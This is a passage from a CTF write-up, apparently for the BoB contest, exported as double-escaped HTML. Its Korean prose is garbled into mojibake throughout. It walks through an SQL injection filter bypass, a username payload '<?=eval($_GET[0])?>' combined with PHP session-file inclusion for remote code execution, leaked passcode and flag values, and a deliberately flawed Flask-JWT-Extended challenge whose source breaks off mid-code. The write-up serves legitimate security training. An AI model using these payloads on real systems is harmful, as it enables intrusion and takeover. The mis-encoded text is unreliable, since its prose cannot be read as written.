&amp;lt;!-- ... --&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ul id=&quot;6f25076f-395c-4480-9704-44f803bf79fa&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;&lt;code&gt;articles.php&lt;/code&gt; ì˜ ì½”ë“œë¥¼ í™•ì¸í•´ë³´ë©´ ê²€ìƒ‰ êµ¬ë¬¸ì—ì„œ &lt;code&gt;sql injection&lt;/code&gt; ì·¨ì•½ì ì´ ë°œìƒí•œë‹¤ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;540cf34b-c985-405b-aef2-43bac66a039b&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;í•˜ì§€ë§Œ ìƒë‹¨ì˜ ì •ê·œí‘œí˜„ì‹ì—ì„œ ì–´ëŠ ì •ë„ì˜ ê³µë°±ê³¼ &lt;code&gt;=&lt;/code&gt;, &lt;code&gt;like&lt;/code&gt; ë“±ì„ í•„í„°ë§ í•˜ê³  ìˆê¸° ë•Œë¬¸ì— ì´ë¥¼ ì ì ˆíˆ ìš°íšŒí•˜ì—¬ í•„ìš”í•œ ì •ë³´ë¥¼ ì–»ì–´ë‚´ì•¼ í•œë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;e3712a3c-c387-4de2-91c0-cd225d6965be&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob933.png&quot;&gt;&lt;img style=&quot;width:1345px&quot; src=&quot;/assets/bob/bob933.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;794abae8-2f06-41d2-8d1b-4569ff1a769f&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ê³µë°±ì´ í•„í„°ë§ ë˜ì—ˆìœ¼ë‹ˆ &lt;code&gt;\x0b&lt;/code&gt; ë˜ëŠ” &lt;code&gt;/**/&lt;/code&gt; ë“±ì˜ ì£¼ì„ì„ ì´ìš©í•˜ì—¬ ê³µë°±ì„ ëŒ€ì²´í•˜ê³ , &lt;code&gt;like&lt;/code&gt; ì™€ &lt;code&gt;=&lt;/code&gt; ê°€ í•„í„°ë§ ë˜ì—ˆìœ¼ë‹ˆ &lt;code&gt;in&lt;/code&gt; ì„ ì‚¬ìš©í•˜ì—¬ ë¹„êµë¥¼ í•´ì£¼ì.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;9565aa9d-d678-4afc-ac01-74a0d0584659&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;&lt;code&gt;sql injection&lt;/code&gt;ì„ í†µí•´ í•´ë‹¹ ë°ì´í„°ë² ì´ìŠ¤ ë‚´ì˜ í…Œì´ë¸” ë¦¬ìŠ¤íŠ¸ë¥¼ ì¶”ì¶œí•˜ì˜€ìœ¼ë©°, ê·¸ ì¤‘ &lt;code&gt;p4SSc0D3&lt;/code&gt; í…Œì´ë¸”ì´ ì¡´ì¬í•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;371a066e-c804-45e9-a69d-7e7136f05a4c&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob934.png&quot;&gt;&lt;img style=&quot;width:916px&quot; src=&quot;/assets/bob/bob934.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;0a09abfd-5c9b-46a7-9a32-8488f68f4d45&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;&lt;code&gt;p4SSc0D3&lt;/code&gt; í…Œì´ë¸”ì˜ ì»¬ëŸ¼ëª…ì€ &lt;code&gt;passcode&lt;/code&gt;ì¸ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;e35d3660-de52-4364-8236-a59e872596ed&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob935.png&quot;&gt;&lt;img style=&quot;width:922px&quot; src=&quot;/assets/bob/bob935.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;f2c2f12d-75ad-4a30-94dd-e68d600fe886&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;h3 id=&quot;3e59e4fc-f4b2-4016-907c-0fc3468d9aa4&quot; class=&quot;&quot;&gt;6. flag í™•ì¸&lt;/h3&gt;&lt;ul id=&quot;025cd1cb-3383-40da-8934-a5c5ff516c0d&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;&lt;code&gt;passcode&lt;/code&gt;ëŠ” &lt;code&gt;5UP3R_S3CUR3_STR0NG_P4S5C0D3&lt;/code&gt; ì¸ ê²ƒì„ í™•ì¸í–ˆìœ¼ë‹ˆ, ì´ì „ì— í™•ì¸í•œ ì›¹ ì„œë¹„ìŠ¤(ê°œ)ì— &lt;code&gt;passcode&lt;/code&gt;ë¥¼ ì…ë ¥í•˜ë©´ &lt;code&gt;flag&lt;/code&gt;ë¥¼ ì–»ì„ ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;f7dfd2d8-33f6-4ca5-9203-a162394c3227&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob936.png&quot;&gt;&lt;img style=&quot;width:612px&quot; src=&quot;/assets/bob/bob936.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;dd209891-1a9d-40e2-8e8e-5d2f3d232189&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;FLAG : &lt;mark class=&quot;highlight-yellow_background&quot;&gt;bob{sabeon_eun_gaein_juiya}&lt;/mark&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;090ace04-9aaf-4ccd-ad40-35288608014d&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;h3 id=&quot;4e1be258-e110-427e-b6a8-6493991f5316&quot; class=&quot;&quot;&gt;7. ì—¬ë‹´ (1)&lt;/h3&gt;&lt;figure id=&quot;ce3315a4-2ee8-4f20-af11-9cb6299410f8&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob937.png&quot;&gt;&lt;img style=&quot;width:1347px&quot; src=&quot;/assets/bob/bob937.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;fd3edfdf-02f8-4256-b3ed-99bf43f6e4ec&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;&lt;code&gt;sql injection&lt;/code&gt;ì„ í†µí•´ &lt;code&gt;admin&lt;/code&gt; í…Œì´ë¸”ê³¼ &lt;code&gt;clue&lt;/code&gt; í…Œì´ë¸”ì´ ìˆëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;3e93bd76-86da-48fc-8856-41e2097f46ce&quot; class=&quot;code&quot;&gt;&lt;code&gt;// ...

if(preg_match(&amp;quot;/(\ |\n|\t|\r|@|insert|update|delete|=|like|admin|substr|concat|-|ascii|`|load|into|clue|text\&amp;quot;)/i&amp;quot;, $search) === 1){
    echo &amp;quot;&amp;lt;script&amp;gt;alert(&amp;#x27;Don\&amp;#x27;t hack!&amp;#x27;);history.back();&amp;lt;/script&amp;gt;&amp;quot;;
    die();
}

// ...&lt;/code&gt;&lt;/pre&gt;&lt;ul id=&quot;75de8847-342c-4759-86fd-a1b318b12d3d&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;í•˜ì§€ë§Œ ëŒ€íšŒ ì„œë¹„ìŠ¤ ì¤‘ &lt;code&gt;articles.php&lt;/code&gt; ì˜ í•„í„°ë§ìœ¼ë¡œ ì¸í•´ &lt;code&gt;clue&lt;/code&gt; ì™€ &lt;code&gt;admin&lt;/code&gt; ëª¨ë‘ ì ‘ê·¼ì´ ë¶ˆê°€ëŠ¥í•œ ìƒíƒœì˜€ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;694fac54-2599-4632-902e-18e00b863a58&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;&lt;code&gt;admin&lt;/code&gt; í…Œì´ë¸”ì€ &lt;code&gt;admin ê³„ì •&lt;/code&gt; ì˜ í‰ë¬¸ íŒ¨ìŠ¤ì›Œë“œë¥¼ ì €ì¥í•´ë‘ì—ˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;1bae7f9e-30be-4921-8382-e3bfb2467c34&quot; class=&quot;code&quot;&gt;&lt;code&gt;&amp;lt;!-- ... --&amp;gt;

&amp;lt;?php
    if($_SESSION[&amp;quot;username&amp;quot;]){
        if($_SESSION[&amp;quot;username&amp;quot;] === &amp;quot;admin&amp;quot;){
            echo &amp;quot;&amp;lt;li&amp;gt;&amp;lt;a href=\&amp;quot;/?page=readme\&amp;quot;&amp;gt;&amp;lt;span&amp;gt;Readme&amp;lt;/span&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;&amp;quot;;
        }
        echo &amp;quot;&amp;lt;li style=\&amp;quot;position: absolute; left: 10rem;\&amp;quot;&amp;gt;&amp;lt;a href=\&amp;quot;#\&amp;quot; style=\&amp;quot;cursor: default;\&amp;quot;&amp;gt;&amp;lt;span&amp;gt;USER : ${_SESSION[&amp;#x27;username&amp;#x27;]}&amp;lt;/span&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;&amp;quot;;
        echo &amp;#x27;&amp;lt;li style=&amp;quot;position: absolute; right: 10rem;&amp;quot;&amp;gt;&amp;lt;a href=&amp;quot;/?page=mypage&amp;quot;&amp;gt;&amp;lt;span&amp;gt;Mypage&amp;lt;/span&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;&amp;#x27;;
        echo &amp;#x27;&amp;lt;li style=&amp;quot;position: absolute; right: 3rem;&amp;quot;&amp;gt;&amp;lt;a href=&amp;quot;/?page=logout&amp;quot;&amp;gt;&amp;lt;span&amp;gt;Logout&amp;lt;/span&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;&amp;#x27;;
    }
    else{
        echo &amp;#x27;&amp;lt;li style=&amp;quot;position: absolute; right: 3rem;&amp;quot;&amp;gt;&amp;lt;a href=&amp;quot;/?page=login&amp;quot;&amp;gt;&amp;lt;span&amp;gt;Login&amp;lt;/span&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;&amp;#x27;;
    }
?&amp;gt;

&amp;lt;!-- ... --&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ul id=&quot;bc172a0b-6ae4-41bc-ab24-01f30ebe76e7&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ê·¸ë¦¬ê³  &lt;code&gt;admin ê³„ì •&lt;/code&gt; ìœ¼ë¡œ ë¡œê·¸ì¸í•˜ë©´ &lt;code&gt;readme.php&lt;/code&gt; í˜ì´ì§€ì— ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ë©”ë‰´ê°€ ìƒê¸´ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;7b2f0159-2060-489c-a312-80909fcb5ddf&quot; class=&quot;code&quot;&gt;&lt;code&gt;&amp;lt;!-- ... --&amp;gt;

&amp;lt;?php
    if($_SESSION[&amp;quot;username&amp;quot;] !== &amp;quot;admin&amp;quot;){
        echo &amp;#x27;&amp;lt;script&amp;gt;alert(&amp;quot;Invalid access.&amp;quot;);history.back();&amp;lt;/script&amp;gt;&amp;#x27;;
        die();
    }

    $stmt = $sql-&amp;gt;prepare(&amp;quot;select text from clue where 1 limit 1&amp;quot;);
    $stmt-&amp;gt;execute();

    $result = $stmt-&amp;gt;get_result();
    $row = $result-&amp;gt;fetch_assoc();
    
    $data = file_get_contents($row[&amp;quot;text&amp;quot;]);

    
    echo $data;
?&amp;gt;

&amp;lt;!-- ... --&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ul id=&quot;5cf5c633-3222-4204-9170-49ae82a32846&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;&lt;code&gt;readme.php&lt;/code&gt; í˜ì´ì§€ëŠ” &lt;code&gt;clue&lt;/code&gt; í…Œì´ë¸”ì— ì¡´ì¬í•˜ëŠ” íŒíŠ¸ ë©”ì‹œì§€ë¥¼ ë°›ì•„ì™€ ì¶œë ¥í•´ì£¼ëŠ” ì—­í• ì„ í•œë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;6f3b2f66-7227-4d38-85f7-8f458e697b15&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob938.png&quot;&gt;&lt;img style=&quot;width:1920px&quot; src=&quot;/assets/bob/bob938.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;21329b91-bc79-4a1a-a432-28ae7fc7033c&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ëŒ€íšŒ ì „ ë‚ , ì ê²°ì— ì½”ë“œ ìˆ˜ì •í•˜ë‹¤ &lt;code&gt;admin&lt;/code&gt; ë¬¸ìì—´ì„ í•„í„°ë§ì— ë„£ëŠ” ë°”ëŒì—,, &lt;code&gt;admin ê³„ì •&lt;/code&gt; ì˜ íŒ¨ìŠ¤ì›Œë“œë¥¼ ì•Œì•„ë‚´ì§€ ëª»í•˜ê²Œ ë˜ì–´ íŒíŠ¸ í˜ì´ì§€ê°€ ì‚¬ë¼ì§€ê²Œ ë˜ì—ˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;0224515c-f0c7-408b-a88f-7313f0d38a74&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì´ë¥¼ ì¸ì§€í–ˆì„ ë• ì´ë¯¸ solverê°€ ë‚˜ì™”ê¸° ë•Œë¬¸ì— ìˆ˜ì •í•  ìˆ˜ ì—†ì–´ íŒíŠ¸ í˜ì´ì§€ëŠ” ì—†ì—ˆë˜ ê²ƒìœ¼ë¡œ,,, ë˜ì—ˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;12ca9c06-7ddf-497f-89b0-f74feae2b57b&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ìœ„ ìŠ¤í¬ë¦°ìƒ·ì´ ì´ì œëŠ” ë“¤ì–´ê°ˆ ìˆ˜ ì—†ì–´ì ¸ë²„ë¦° &lt;code&gt;íŒíŠ¸ í˜ì´ì§€&lt;/code&gt; ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;efb3a3ca-e1d5-4a9e-ba33-7154f8e6c12f&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;h3 id=&quot;3d37181d-0b86-4f60-8c95-409b110dbc63&quot; class=&quot;&quot;&gt;8. ì—¬ë‹´ (2) â†’ Unintended Solution&lt;/h3&gt;&lt;ul id=&quot;0a073c3e-a2f9-4dc5-80e3-3de1b8751837&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;&lt;code&gt;ì´ì§„*&lt;/code&gt;, &lt;code&gt;ê¹€ê²½*&lt;/code&gt; ë‹˜ê»˜ì„œ ìœ„ì— ì„¤ëª…í–ˆë˜ &lt;code&gt;/home/php/.bash_history&lt;/code&gt; ì°¸ì¡°ë¥¼ í†µí•œ í’€ì´ê°€ ì•„ë‹Œ &lt;code&gt;rce&lt;/code&gt; ë¡œ ë¬¸ì œë¥¼ í’€ì´í•˜ì—¬, ì´ì— ëŒ€í•œ ì„¤ëª…ë„ ì§„í–‰í•˜ê² ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;d21028e3-aa5b-41a9-ae6b-06d14d8396df&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;lfiì™€ sqliì˜ ê³¼ì •ì€ ë™ì¼í•˜ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;5801f382-b44e-4a8f-a71f-accd1bfd3734&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob939.png&quot;&gt;&lt;img style=&quot;width:1003px&quot; src=&quot;/assets/bob/bob939.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;f541eca3-a0cf-4bb3-870d-17c80ace4f1e&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;í—¤ë” ë©”ë‰´ë¥¼ í™•ì¸í•´ë³´ë©´, ë¡œê·¸ì¸ ì‹œ &lt;code&gt;USER : {USERNAME}&lt;/code&gt; ì˜ í˜•íƒœë¡œ ì¶œë ¥ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;3082b693-dcf6-441e-902c-cfa632e140d7&quot; class=&quot;code&quot;&gt;&lt;code&gt;&amp;lt;!-- ... --&amp;gt;

&amp;lt;?php
    if($_SESSION[&amp;quot;username&amp;quot;]){
        if($_SESSION[&amp;quot;username&amp;quot;] === &amp;quot;admin&amp;quot;){
            echo &amp;quot;&amp;lt;li&amp;gt;&amp;lt;a href=\&amp;quot;/?page=readme\&amp;quot;&amp;gt;&amp;lt;span&amp;gt;Readme&amp;lt;/span&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;&amp;quot;;
        }
        echo &amp;quot;&amp;lt;li style=\&amp;quot;position: absolute; left: 10rem;\&amp;quot;&amp;gt;&amp;lt;a href=\&amp;quot;#\&amp;quot; style=\&amp;quot;cursor: default;\&amp;quot;&amp;gt;&amp;lt;span&amp;gt;USER : ${_SESSION[&amp;#x27;username&amp;#x27;]}&amp;lt;/span&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;&amp;quot;;
        echo &amp;#x27;&amp;lt;li style=&amp;quot;position: absolute; right: 10rem;&amp;quot;&amp;gt;&amp;lt;a href=&amp;quot;/?page=mypage&amp;quot;&amp;gt;&amp;lt;span&amp;gt;Mypage&amp;lt;/span&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;&amp;#x27;;
        echo &amp;#x27;&amp;lt;li style=&amp;quot;position: absolute; right: 3rem;&amp;quot;&amp;gt;&amp;lt;a href=&amp;quot;/?page=logout&amp;quot;&amp;gt;&amp;lt;span&amp;gt;Logout&amp;lt;/span&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;&amp;#x27;;
    }
    else{
        echo &amp;#x27;&amp;lt;li style=&amp;quot;position: absolute; right: 3rem;&amp;quot;&amp;gt;&amp;lt;a href=&amp;quot;/?page=login&amp;quot;&amp;gt;&amp;lt;span&amp;gt;Login&amp;lt;/span&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;&amp;#x27;;
    }
?&amp;gt;

&amp;lt;!-- ... --&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ul id=&quot;96d051b5-a7e6-4177-8bbb-26fcbbaea7c1&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;&lt;code&gt;header.php&lt;/code&gt; ë¥¼ í™•ì¸í•´ë³´ë©´ &lt;code&gt;$_SESSION[&amp;#x27;username&amp;#x27;]&lt;/code&gt; ìœ¼ë¡œ ì„¸ì…˜ì— ì €ì¥ëœ usernameì„ ê°€ì ¸ì˜¨ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;20f2ede4-f910-4d41-b5ba-f9c9d00a9604&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;usernameì— &lt;code&gt;&amp;lt;?=eval($_GET[0])?&amp;gt;&lt;/code&gt; ì™€ ê°™ì€ PHP expression tagë¥¼ ì‚¬ìš©í•˜ì—¬ eval ì½”ë“œë¥¼ ì‚½ì…í•œ í›„ íšŒì›ê°€ì… ë° ë¡œê·¸ì¸í•œë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;b465e88f-f39c-4c2e-af3a-5d62ea78655e&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì´í›„ ì¼ë°˜ì ìœ¼ë¡œ ì„¸ì…˜ì´ ì €ì¥ë˜ëŠ” ìœ„ì¹˜ì¸ &lt;code&gt;/var/lib/php/session/&lt;/code&gt; ë””ë ‰í† ë¦¬ì˜ &lt;code&gt;sess_{PHPSESSID}&lt;/code&gt; íŒŒì¼ì„ lfi ì·¨ì•½ì ì„ í†µí•´ includeí•˜ì—¬ &lt;code&gt;rce&lt;/code&gt; í•œë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;cf58b958-c416-4f79-9d04-f0fb8364fd5b&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob940.png&quot;&gt;&lt;img style=&quot;width:1918px&quot; src=&quot;/assets/bob/bob940.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure id=&quot;ad50bb0a-be78-4acf-ac5e-6f20ffe40e7a&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob941.png&quot;&gt;&lt;img style=&quot;width:1116px&quot; src=&quot;/assets/bob/bob941.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure id=&quot;ec8d501c-a512-475a-87cc-6457668f0249&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob942.png&quot;&gt;&lt;img style=&quot;width:1232px&quot; src=&quot;/assets/bob/bob942.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;ce117fe7-d8f3-4730-8a87-6c493a675b1e&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ìœ„ì™€ ê°™ì´ &lt;code&gt;rce&lt;/code&gt; ë¥¼ ì§„í–‰í•œ í›„, python flask ì†ŒìŠ¤ì½”ë“œê°€ ìˆëŠ” &lt;code&gt;/app&lt;/code&gt; ë””ë ‰í† ë¦¬ë¥¼ ì°¾ì•„ í•´ë‹¹ &lt;code&gt;/app/app.py&lt;/code&gt; ë¥¼ ì½ì–´ í¬íŠ¸ ë²ˆí˜¸ë¥¼ ì•Œì•„ë‚¸ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;d5d373aa-4fa8-4ceb-a87b-f9c4aa541b65&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ê·¸ë¦¬ê³  &lt;code&gt;curl ëª…ë ¹ì–´&lt;/code&gt; ë˜ëŠ” &lt;code&gt;ssrf ì·¨ì•½ì &lt;/code&gt; ì„ ì´ìš©í•˜ì—¬ &lt;code&gt;http://localhost:2026/flag&lt;/code&gt; í˜ì´ì§€ì— ì ‘ê·¼í•˜ì—¬ í”Œë˜ê·¸ë¥¼ íšë“í•œë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;e733c7ed-1211-455d-bfa2-a0a1ae5876e2&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;ul id=&quot;1d68c81c-1990-44a6-a602-ca9935eb1661&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;php ê³„ì •ì€ &lt;code&gt;/flag&lt;/code&gt; íŒŒì¼ì— ëŒ€í•œ ì½ê¸° ê¶Œí•œì´ ì—†ê¸° ë•Œë¬¸ì— &lt;code&gt;cat /flag&lt;/code&gt;  ë˜ëŠ” &lt;code&gt;lfi ì·¨ì•½ì &lt;/code&gt; ìœ¼ë¡œëŠ” ì½ì„ ìˆ˜ ì—†ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;7335d63e-5568-4b80-8dea-649f73a41875&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;h2 id=&quot;a31b9d7a-2454-4408-9796-7743bdfe01d9&quot; class=&quot;&quot;&gt;JWT-Extended&lt;/h2&gt;&lt;hr id=&quot;eebf10ba-3457-4714-b260-a4526f45496f&quot;/&gt;&lt;figure id=&quot;e78a0135-4f17-4084-b6f1-6fc4b265b787&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob943.png&quot;&gt;&lt;img style=&quot;width:711px&quot; src=&quot;/assets/bob/bob943.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class=&quot;block-color-gray_background callout&quot; style=&quot;white-space:pre-wrap;display:flex&quot; id=&quot;b73ab37f-b214-4154-9264-c4a2f1bf8070&quot;&gt;&lt;div style=&quot;font-size:1.5em&quot;&gt;&lt;span class=&quot;icon&quot;&gt;ğŸ’¡&lt;/span&gt;&lt;/div&gt;&lt;div style=&quot;width:100%&quot;&gt;ì•ˆì „í•˜ì§€ ì•Šì€ Flask-JWT-Extended ëª¨ë“ˆ ì‚¬ìš©&lt;/div&gt;&lt;/figure&gt;&lt;ul id=&quot;11967519-126b-4132-b629-e34c241c1736&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;JWT í† í°ì„ ì „ì†¡í•˜ëŠ” ë°©ë²•ì„ ì—¬ëŸ¬ ê°€ì§€ë¡œ ì‹œë„í•´ë³¼ ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;6235aa2e-8a85-437c-96fc-dfc2e70afe00&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ë¬¸ì œì—ì„œ /flagë¡œ ì•„ë¬´ëŸ° ê°’ì„ ë„£ì§€ ì•Šê³  ì ‘ê·¼í•´ë³´ë©´ ë‹¤ìŒê³¼ ê°™ì€ msgë¥¼ ë°›ì„ ìˆ˜ ìˆë‹¤. ì—¬ê¸°ì„œ cookies or headers ë¼ëŠ” ë¬¸êµ¬ë¥¼ í†µí•´ í† í° ê°’ì„ ì ì ˆíˆ ë„£ì–´ì¤„ ê³³ì„ ì˜ˆìƒí•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;7ce775c1-6844-439a-ab52-57d693493446&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob944.png&quot;&gt;&lt;img style=&quot;width:854px&quot; src=&quot;/assets/bob/bob944.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;e02d3a07-4716-4c00-8106-49e52c91b73b&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;Cookieì™€ Headerë¥¼ ë²ˆê°ˆì•„ê°€ë©° ë§Œë£Œë˜ê±°ë‚˜ ë§Œë£Œë˜ì§€ ì•Šì€ ê°’ì„ ì‚½ì…í•œ í›„ ì „ì†¡í•˜ê²Œ ë˜ë©´ í’€ë¦¬ëŠ” ë¬¸ì œë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;143272a0-9c5d-4aa5-98c9-49d869d1cc51&quot; class=&quot;&quot;&gt;ë¬¸ì œ ìƒì„¸ ì„¤ëª…&lt;/h2&gt;&lt;ul id=&quot;7b13971a-3ba4-4420-9a84-3a3f4a17fff9&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì›ë˜ì˜ ë¬¸ì œ ì†ŒìŠ¤ëŠ” ì•„ë˜ì™€ ê°™ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;043dd2bd-12d9-4ec6-af52-37374b16444f&quot; class=&quot;code&quot;&gt;&lt;code&gt;#!/usr/bin/env python3
from flask import (
    Flask,
    request,
    jsonify
)
from flask_jwt_extended import (
    JWTManager,
    jwt_required,
    create_access_token,
    decode_token,
    get_jwt_identity,
)

from jwt.utils      import base64url_decode
from jwt.algorithms import get_default_algorithms

import datetime, time, json
 

def is_expired(token):
    if decode_token(token, allow_expired=True)[&amp;#x27;exp&amp;#x27;] &amp;lt; int(time.time()):
        return True   
    
    return False


def create_app(config=&amp;quot;app.config.Config&amp;quot;):
    # Setup flask
    app = Flask(__name__)

    app.config.from_object(config)

    @app.route(&amp;quot;/&amp;quot;)
    def index():
        return &amp;quot;POST : /login &amp;lt;br&amp;gt;\nGET : /flag&amp;quot;
    
    # Standard login endpoint
    @app.route(&amp;#x27;/login&amp;#x27;, methods=[&amp;#x27;POST&amp;#x27;])
    def login():
        try:
            username = request.json.get(&amp;#x27;username&amp;#x27;, None)
            password = request.json.get(&amp;#x27;password&amp;#x27;, None)
        except:
            return jsonify({&amp;quot;msg&amp;quot;:&amp;quot;&amp;quot;&amp;quot;Bad request. Submit your login / pass as {&amp;quot;username&amp;quot;:&amp;quot;admin&amp;quot;,&amp;quot;password&amp;quot;:&amp;quot;admin&amp;quot;}&amp;quot;&amp;quot;&amp;quot;}), 400
    
        if username != &amp;#x27;admin&amp;#x27; or password != &amp;#x27;admin&amp;#x27;:
            return jsonify({&amp;quot;msg&amp;quot;: &amp;quot;Bad username or password&amp;quot;}), 401
    
        access_token = create_access_token( identity=username,
                                            expires_delta=datetime.timedelta(minutes=1))

        ret = {
            &amp;#x27;access_token&amp;#x27;: access_token,
        }
    
        return jsonify(ret), 200
    
    @app.route(&amp;#x27;/flag&amp;#x27;, methods=[&amp;#x27;GET&amp;#x27;])
    @jwt_required
    def flag():
        try:
            access_token = request.headers.get(&amp;quot;Authorization&amp;quot;).split()[1]
        except:
            return jsonify({&amp;quot;msg&amp;quot;           : &amp;quot;No Token!&amp;quot;})

        current_user = get_jwt_identity()
        
        if current_user == &amp;#x27;admin&amp;#x27; and is_expired(access_token):
            # Here your Flag / It is not Race condition
            return jsonify({&amp;quot;Good For You&amp;quot;  : app.config[&amp;#x27;FLAG&amp;#x27;]})
        else:
            return jsonify({&amp;quot;msg&amp;quot;           :&amp;quot;Not Expired Token!&amp;quot;})
    

    with app.app_context():
